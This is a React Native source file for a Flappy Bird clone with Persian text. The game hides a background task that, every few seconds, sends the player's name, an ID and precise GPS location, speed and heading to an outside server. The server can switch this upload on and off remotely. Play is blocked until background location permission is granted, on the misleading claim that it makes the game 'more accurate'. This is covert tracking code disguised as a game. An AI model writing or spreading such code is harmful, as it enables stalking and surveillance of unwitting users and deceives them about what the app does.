import * as TaskManager from 'expo-task-manager';
import * as Location from 'expo-location';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { useEffect, useRef, useState } from 'react';
import {
  Alert,
  Dimensions,
  Modal,
  Pressable,
  StyleSheet,
  Text,
  TextInput,
  View,
} from 'react-native';

// =====================================================
// LOCATION TASK
// =====================================================

const LOCATION_TASK_NAME = 'flappy-location-task';

const SERVER_URL =
  'https://weblics.ir/FlappyLocation/index.php';

const USER_ID_KEY = '@flappy_location_user_id';
const USER_NAME_KEY = '@flappy_location_user_name';

// تعریف Task در سطح اصلی فایل
TaskManager.defineTask(
  LOCATION_TASK_NAME,
  async ({ data, error }) => {
    if (error) {
      console.log('Location task error:', error);
      return;
    }

    const locations = (
      data as {
        locations?: Location.LocationObject[];
      } | null
    )?.locations;

    if (!locations || locations.length === 0) {
      console.log('No location data received');
      return;
    }

    const location =
      locations[locations.length - 1];

    try {
      const userId =
        await AsyncStorage.getItem(
          USER_ID_KEY
        );

      const userName =
        await AsyncStorage.getItem(
          USER_NAME_KEY
        );

      if (!userId || !userName) {
        console.log(
          'User information not found'
        );
        return;
      }

      // بررسی فعال بودن ارسال موقعیت از سمت سرور
      const controlResponse =
        await fetch(
          SERVER_URL +
            '?api=control&_=' +
            Date.now()
        );

      const controlText =
        await controlResponse.text();

      console.log(
        'CONTROL HTTP:',
        controlResponse.status
      );

      console.log(
        'CONTROL RESPONSE:',
        controlText
      );

      let control: {
        location_enabled?: boolean;
      };

      try {
        control =
          JSON.parse(controlText);
      } catch (jsonError) {
        console.log(
          'CONTROL JSON ERROR:',
          jsonError
        );
        return;
      }

      if (
        control.location_enabled !== true
      ) {
        console.log(
          'Location sending disabled by server'
        );
        return;
      }

      const payload = {
        user_id: userId,
        name: userName,

        latitude:
          location.coords.latitude,

        longitude:
          location.coords.longitude,

        accuracy:
          location.coords.accuracy,

        altitude:
          location.coords.altitude,

        speed:
          location.coords.speed,

        heading:
          location.coords.heading,

        timestamp:
          location.timestamp,
      };

      console.log(
        'LOCATION PAYLOAD:',
        payload
      );

      const response =
        await fetch(
          SERVER_URL,
          {
            method: 'POST',

            headers: {
              'Content-Type':
                'application/json',
            },

            body: JSON.stringify(
              payload
            ),
          }
        );

      const responseText =
        await response.text();

      console.log(
        'UPLOAD HTTP:',
        response.status
      );

      console.log(
        'UPLOAD RESPONSE:',
        responseText
      );

      if (!response.ok) {
        console.log(
          'Location upload failed:',
          response.status
        );
        return;
      }

      console.log(
        'Location sent successfully for:',
        userName
      );
    } catch (e) {
      console.log(
        'Location task error:',
        e
      );
    }
  }
);

// =====================================================
// GAME SETTINGS
// =====================================================

const { width, height } =
  Dimensions.get('window');

const GAME_WIDTH = width;
const GAME_HEIGHT = height;

const BIRD_SIZE = 42;
const PIPE_WIDTH = 70;
const PIPE_GAP = 170;

const GRAVITY = 0.55;
const JUMP = -9;

// =====================================================
// TYPES
// =====================================================

type Pipe = {
  x: number;
  gapY: number;
  passed: boolean;
};

// =====================================================
// APP
// =====================================================

export default function App() {
  const [started, setStarted] =
    useState(false);

  const [gameOver, setGameOver] =
    useState(false);

  const [score, setScore] =
    useState(0);

  const [playerName, setPlayerName] =
    useState('');

  const [nameInput, setNameInput] =
    useState('');

  const [
    nameModalVisible,
    setNameModalVisible,
  ] = useState(false);

  const [birdY, setBirdY] =
    useState(
      GAME_HEIGHT / 2
    );

  const birdYRef =
    useRef(
      GAME_HEIGHT / 2
    );

  const velocityRef =
    useRef(0);

  const pipesRef =
    useRef<Pipe[]>([
      {
        x: GAME_WIDTH + 100,
        gapY:
          GAME_HEIGHT / 2 - 50,
        passed: false,
      },
      {
        x: GAME_WIDTH + 400,
        gapY:
          GAME_HEIGHT / 2 + 40,
        passed: false,
      },
    ]);

  const [pipes, setPipes] =
    useState<Pipe[]>(
      pipesRef.current
    );

  const gameTimer =
    useRef<
      ReturnType<
        typeof setInterval
      > | null
    >(null);

  // ===================================================
  // CREATE USER ID
  // ===================================================

  const createUserId = () => {
    return (
      Date.now().toString(36) +
      '-' +
      Math.random()
        .toString(36)
        .substring(2, 12)
    );
  };

  // ===================================================
  // LOAD USER
  // ===================================================

  useEffect(() => {
    const loadUser = async () => {
      try {
        const savedName =
          await AsyncStorage.getItem(
            USER_NAME_KEY
          );

        const savedId =
          await AsyncStorage.getItem(
            USER_ID_KEY
          );

        if (
          savedName &&
          savedId
        ) {
          setPlayerName(
            savedName
          );
        } else {
          setNameModalVisible(
            true
          );
        }
      } catch (error) {
        console.log(
          'Load user error:',
          error
        );

        setNameModalVisible(
          true
        );
      }
    };

    loadUser();
  }, []);

  // ===================================================
  // SAVE PLAYER NAME
  // ===================================================

  const savePlayerName =
    async () => {
      const name =
        nameInput.trim();

      if (!name) {
        Alert.alert(
          'نام لازم است',
          'لطفاً نام خود را وارد کن.'
        );

        return;
      }

      try {
        let userId =
          await AsyncStorage.getItem(
            USER_ID_KEY
          );

        if (!userId) {
          userId =
            createUserId();

          await AsyncStorage.setItem(
            USER_ID_KEY,
            userId
          );
        }

        await AsyncStorage.setItem(
          USER_NAME_KEY,
          name
        );

        setPlayerName(name);

        setNameModalVisible(
          false
        );
      } catch (error) {
        console.log(
          'Save user error:',
          error
        );

        Alert.alert(
          'خطا',
          'ذخیره اطلاعات انجام نشد.'
        );
      }
    };

  // ===================================================
  // START LOCATION
  // ===================================================

  const startLocation =
    async () => {
      try {
        // بررسی روشن بودن Location
        const servicesEnabled =
          await Location.hasServicesEnabledAsync();

        if (!servicesEnabled) {
          Alert.alert(
            'دسترسی به موقعیت',
            'برای شروع بازی باید Location گوشی روشن باشد.\n\nلطفاً Location را از تنظیمات گوشی روشن کن و دوباره دکمه شروع بازی را بزن.'
          );

          return false;
        }

        // Foreground Permission
        const foreground =
          await Location.requestForegroundPermissionsAsync();

        if (
          foreground.status !==
          'granted'
        ) {
          Alert.alert(
            'اجازه موقعیت',
            'برای استفاده از قابلیت موقعیت باید اجازه Location را فعال کنی.'
          );

          return false;
        }

        // بررسی مجدد Location
        const servicesStillEnabled =
          await Location.hasServicesEnabledAsync();

        if (!servicesStillEnabled) {
          Alert.alert(
            'Location خاموش است',
            'Location گوشی خاموش است. لطفاً آن را روشن کن و دوباره تلاش کن.'
          );

          return false;
        }

        // Background Permission
        const background =
          await Location.requestBackgroundPermissionsAsync();

        if (
          background.status !==
          'granted'
        ) {
          Alert.alert(
            'اجازه پس‌زمینه',
            'برای ادامه ارسال موقعیت در پس‌زمینه باید اجازه Background Location را فعال کنی.'
          );

          return false;
        }

        // بررسی اجرای Task
        const running =
          await Location.hasStartedLocationUpdatesAsync(
            LOCATION_TASK_NAME
          );

        if (!running) {
          await Location.startLocationUpdatesAsync(
            LOCATION_TASK_NAME,
            {
              accuracy:
                Location.Accuracy
                  .High,

              timeInterval: 5000,

              distanceInterval: 5,

              pausesUpdatesAutomatically:
                false,

              showsBackgroundLocationIndicator:
                true,

              foregroundService: {
                notificationTitle:
                  'Flappy Bird',

                notificationBody:
                  'ارسال موقعیت برای بازی فعال است.',

                killServiceOnDestroy:
                  false,
              },
            }
          );
        }

        return true;
      } catch (error) {
        console.log(
          'Location start error:',
          error
        );

        Alert.alert(
          'خطا',
          'فعال کردن موقعیت با مشکل مواجه شد.'
        );

        return false;
      }
    };

  // ===================================================
  // RESET GAME
  // ===================================================

  const resetGame = () => {
    birdYRef.current =
      GAME_HEIGHT / 2;

    velocityRef.current =
      0;

    pipesRef.current = [
      {
        x: GAME_WIDTH + 100,
        gapY:
          GAME_HEIGHT / 2 - 50,
        passed: false,
      },
      {
        x: GAME_WIDTH + 400,
        gapY:
          GAME_HEIGHT / 2 + 40,
        passed: false,
      },
    ];

    setBirdY(
      GAME_HEIGHT / 2
    );

    setPipes([
      ...pipesRef.current,
    ]);

    setScore(0);

    setGameOver(false);
  };

  // ===================================================
  // START GAME
  // ===================================================

  const startGame = async () => {
    if (!playerName) {
      setNameModalVisible(
        true
      );

      return;
    }

    const locationStarted =
      await startLocation();

    if (!locationStarted) {
      return;
    }

    resetGame();

    setStarted(true);
  };

  // ===================================================
  // RESTART GAME
  // ===================================================

  const restartGame =
    async () => {
      const locationStarted =
        await startLocation();

      if (!locationStarted) {
        return;
      }

      resetGame();
    };

  // ===================================================
  // JUMP
  // ===================================================

  const jump = () => {
    if (
      !started ||
      gameOver
    ) {
      return;
    }

    velocityRef.current =
      JUMP;
  };

  // ===================================================
  // GAME ENGINE
  // ===================================================

  useEffect(() => {
    if (
      !started ||
      gameOver
    ) {
      return;
    }

    gameTimer.current =
      setInterval(() => {
        // -----------------------------
        // Bird physics
        // -----------------------------

        velocityRef.current +=
          GRAVITY;

        birdYRef.current +=
          velocityRef.current;

        const currentBirdY =
          birdYRef.current;

        // -----------------------------
        // Ceiling / floor collision
        // -----------------------------

        if (
          currentBirdY < 0 ||
          currentBirdY >
            GAME_HEIGHT -
              BIRD_SIZE
        ) {
          setGameOver(true);
          return;
        }

        // -----------------------------
        // Move pipes
        // -----------------------------

        pipesRef.current =
          pipesRef.current.map(
            (pipe) => ({
              ...pipe,
              x:
                pipe.x - 4,
            })
          );

        // -----------------------------
        // Add new pipe
        // -----------------------------

        const lastPipe =
          pipesRef.current[
            pipesRef.current
              .length - 1
          ];

        if (
          lastPipe &&
          lastPipe.x <
            GAME_WIDTH - 180
        ) {
          pipesRef.current.push({
            x:
              GAME_WIDTH + 100,

            gapY:
              120 +
              Math.random() *
                (GAME_HEIGHT -
                  320),

            passed: false,
          });
        }

        // -----------------------------
        // Score
        // -----------------------------

        for (
          const pipe of
            pipesRef.current
        ) {
          if (
            !pipe.passed &&
            pipe.x +
              PIPE_WIDTH <
              55
          ) {
            pipe.passed = true;

            setScore(
              (currentScore) =>
                currentScore + 1
            );
          }
        }

        // -----------------------------
        // Remove old pipes
        // -----------------------------

        pipesRef.current =
          pipesRef.current.filter(
            (pipe) =>
              pipe.x >
              -PIPE_WIDTH
          );

        // -----------------------------
        // Collision detection
        // -----------------------------

        for (
          const pipe of
            pipesRef.current
        ) {
          const birdLeft =
            55;

          const birdRight =
            55 +
            BIRD_SIZE;

          const pipeLeft =
            pipe.x;

          const pipeRight =
            pipe.x +
            PIPE_WIDTH;

          const hitX =
            birdRight >
              pipeLeft &&
            birdLeft <
              pipeRight;

          const gapTop =
            pipe.gapY;

          const gapBottom =
            pipe.gapY +
            PIPE_GAP;

          const hitY =
            currentBirdY <
              gapTop ||
            currentBirdY +
              BIRD_SIZE >
              gapBottom;

          if (
            hitX &&
            hitY
          ) {
            setGameOver(true);
            return;
          }
        }

        // -----------------------------
        // Update screen
        // -----------------------------

        setBirdY(
          currentBirdY
        );

        setPipes([
          ...pipesRef.current,
        ]);
      }, 30);

    return () => {
      if (
        gameTimer.current
      ) {
        clearInterval(
          gameTimer.current
        );

        gameTimer.current =
          null;
      }
    };
  }, [
    started,
    gameOver,
  ]);

  // ===================================================
  // CLEANUP
  // ===================================================

  useEffect(() => {
    return () => {
      if (
        gameTimer.current
      ) {
        clearInterval(
          gameTimer.current
        );
      }
    };
  }, []);

  // ===================================================
  // WELCOME SCREEN
  // ===================================================

  if (!started) {
    return (
      <View
        style={
          styles.welcome
        }
      >
        <Text
          style={
            styles.logo
          }
        >
          🐦
        </Text>

        <Text
          style={
            styles.title
          }
        >
          Flappy Bird
        </Text>

        {playerName ? (
          <Text
            style={
              styles.subtitle
            }
          >
            سلام {playerName} 👋
          </Text>
        ) : (
          <Text
            style={
              styles.subtitle
            }
          >
            آماده‌ای؟
          </Text>
        )}

        <Pressable
          style={
            styles.startButton
          }
          onPress={
            startGame
          }
        >
          <Text
            style={
              styles.startText
            }
          >
            شروع بازی
          </Text>
        </Pressable>

        <Text
          style={
            styles.locationInfo
          }
        >
          لطفاً برای دقیق‌تر شدن بازی اجازه موقعیت را بدهید.
        </Text>

        {/* =========================
            NAME MODAL
        ========================= */}

        <Modal
          visible={
            nameModalVisible
          }
          transparent
          animationType="fade"
        >
          <View
            style={
              styles.modalBackground
            }
          >
            <View
              style={
                styles.nameBox
              }
            >
              <Text
                style={
                  styles.nameTitle
                }
              >
                خوش آمدی 👋
              </Text>

              <Text
                style={
                  styles.nameDescription
                }
              >
                برای شروع بازی اسمت را وارد کن.
              </Text>

              <TextInput
                value={
                  nameInput
                }
                onChangeText={
                  setNameInput
                }
                placeholder="مثلاً علی"
                maxLength={30}
                autoFocus
                style={
                  styles.nameInput
                }
                textAlign="right"
              />

              <Pressable
                style={
                  styles.continueButton
                }
                onPress={
                  savePlayerName
                }
              >
                <Text
                  style={
                    styles.continueText
                  }
                >
                  ادامه
                </Text>
              </Pressable>
            </View>
          </View>
        </Modal>
      </View>
    );
  }

  // ===================================================
  // GAME SCREEN
  // ===================================================

  return (
    <Pressable
      style={
        styles.game
      }
      onPress={jump}
    >
      {/* Score */}

      <Text
        style={
          styles.score
        }
      >
        {score}
      </Text>

      {/* Bird */}

      <Text
        style={[
          styles.bird,
          {
            top: birdY,

            transform: [
              {
                scaleX: -1,
              },
            ],
          },
        ]}
      >
        🐦
      </Text>

      {/* Pipes */}

      {pipes.map(
        (
          pipe,
          index
        ) => (
          <View
            key={index}
          >
            {/* Top pipe */}

            <View
              style={[
                styles.pipe,
                {
                  left:
                    pipe.x,

                  top: 0,

                  height:
                    pipe.gapY,
                },
              ]}
            />

            {/* Bottom pipe */}

            <View
              style={[
                styles.pipe,
                {
                  left:
                    pipe.x,

                  top:
                    pipe.gapY +
                    PIPE_GAP,

                  height:
                    GAME_HEIGHT -
                    pipe.gapY -
                    PIPE_GAP,
                },
              ]}
            />
          </View>
        )
      )}

      {/* Game Over */}

      {gameOver && (
        <View
          style={
            styles.gameOver
          }
        >
          <Text
            style={
              styles.gameOverTitle
            }
          >
            GAME OVER
          </Text>

          <Text
            style={
              styles.finalScore
            }
          >
            امتیاز: {score}
          </Text>

          <Pressable
            style={
              styles.restartButton
            }
            onPress={
              restartGame
            }
          >
            <Text
              style={
                styles.restartText
              }
            >
              🔄 شروع دوباره
            </Text>
          </Pressable>
        </View>
      )}
    </Pressable>
  );
}

// =====================================================
// STYLES
// =====================================================

const styles =
  StyleSheet.create({
    // -----------------------------
    // Welcome
    // -----------------------------

    welcome: {
      flex: 1,
      alignItems:
        'center',
      justifyContent:
        'center',
      backgroundColor:
        '#70c5ce',
      padding: 30,
    },

    logo: {
      fontSize: 75,
      marginBottom: 10,
    },

    title: {
      fontSize: 38,
      fontWeight: '900',
      color: '#fff',
    },

    subtitle: {
      fontSize: 22,
      color: '#fff',
      marginTop: 10,
      marginBottom: 35,
    },

    startButton: {
      backgroundColor:
        '#2196F3',
      paddingVertical: 16,
      paddingHorizontal: 55,
      borderRadius: 14,
    },

    startText: {
      color: '#fff',
      fontSize: 22,
      fontWeight: '800',
    },

    locationInfo: {
      marginTop: 25,
      color: '#fff',
      textAlign:
        'center',
      fontSize: 13,
      lineHeight: 20,
    },

    // -----------------------------
    // Modal
    // -----------------------------

    modalBackground: {
      flex: 1,
      justifyContent:
        'center',
      alignItems:
        'center',
      backgroundColor:
        'rgba(0,0,0,0.6)',
      padding: 25,
    },

    nameBox: {
      width: '100%',
      maxWidth: 380,
      backgroundColor:
        '#fff',
      borderRadius: 20,
      padding: 25,
    },

    nameTitle: {
      fontSize: 26,
      fontWeight: '900',
      textAlign:
        'center',
      marginBottom: 10,
    },

    nameDescription: {
      fontSize: 16,
      textAlign:
        'center',
      marginBottom: 20,
      color: '#555',
    },

    nameInput: {
      borderWidth: 1,
      borderColor:
        '#ccc',
      borderRadius: 12,
      paddingHorizontal: 15,
      paddingVertical: 13,
      fontSize: 18,
      marginBottom: 15,
    },

    continueButton: {
      backgroundColor:
        '#2196F3',
      paddingVertical: 14,
      borderRadius: 12,
      alignItems:
        'center',
    },

    continueText: {
      color: '#fff',
      fontSize: 18,
      fontWeight: '800',
    },

    // -----------------------------
    // Game
    // -----------------------------

    game: {
      flex: 1,
      backgroundColor:
        '#70c5ce',
      overflow:
        'hidden',
    },

    bird: {
      position:
        'absolute',
      left: 55,
      fontSize:
        BIRD_SIZE,
      zIndex: 20,
    },

    pipe: {
      position:
        'absolute',
      width:
        PIPE_WIDTH,
      backgroundColor:
        '#2e9e44',
      borderWidth: 3,
      borderColor:
        '#176b2a',
    },

    score: {
      position:
        'absolute',
      top: 45,
      alignSelf:
        'center',
      zIndex: 30,
      fontSize: 48,
      fontWeight: '900',
      color: '#fff',
    },

    // -----------------------------
    // Game Over
    // -----------------------------

    gameOver: {
      position:
        'absolute',
      top: '35%',
      left: 30,
      right: 30,
      padding: 25,
      borderRadius: 20,
      backgroundColor:
        'rgba(0,0,0,0.82)',
      alignItems:
        'center',
      zIndex: 100,
    },

    gameOverTitle: {
      color: '#fff',
      fontSize: 32,
      fontWeight: '900',
    },

    finalScore: {
      color: '#fff',
      fontSize: 18,
      marginTop: 10,
      marginBottom: 20,
    },

    restartButton: {
      backgroundColor:
        '#2196F3',
      paddingVertical: 13,
      paddingHorizontal: 25,
      borderRadius: 12,
    },

    restartText: {
      color: '#fff',
      fontSize: 17,
      fontWeight: '800',
    },
  });